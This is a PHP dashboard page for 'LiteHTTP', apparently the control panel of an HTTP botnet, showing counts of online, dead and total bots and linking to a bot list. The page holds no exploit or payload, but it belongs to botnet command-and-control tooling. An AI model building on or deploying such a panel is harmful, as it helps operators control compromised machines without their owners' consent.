<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];

include 'inc/stats.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li class="active">
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li>
						<a href="?p=botlist">
							<i class="fa fa-list"></i> <span>Bot List</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="row">
					<div class="col-lg-4 col-xs-9">
                            		<div class="small-box bg-green">
                                			<div class="inner">
                                    			<h3><?php echo $online; ?></h3>
                                    			<p>Bots Online</p>
                                			</div>
							<div class="icon">
                                    			<i class="fa fa-cloud-upload"></i>
                                			</div>
							<a class="small-box-footer"><br></a>
                            		</div>
                        		</div>
					<div class="col-lg-4 col-xs-9">
						<div class="small-box bg-red">
							<div class="inner">
								<h3><?php echo $dead; ?></h3>
								<p>Dead Bots</p>
							</div>
							<div class="icon">
								<i class="fa fa-close"></i>
							</div>
							<a class="small-box-footer"><br></a>
						</div>
					</div>
					<div class="col-lg-4 col-xs-9">
						<div class="small-box bg-aqua">
							<div class="inner">
								<h3><?php echo $total; ?></h3>
								<p>Total Bots</p>
							</div>
							<div class="icon">
								<i class="fa fa-list"></i>
							</div>
							<a class="small-box-footer"><br></a>
						</div>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="js/jquery-ui.min.js"></script>
</body>
</html>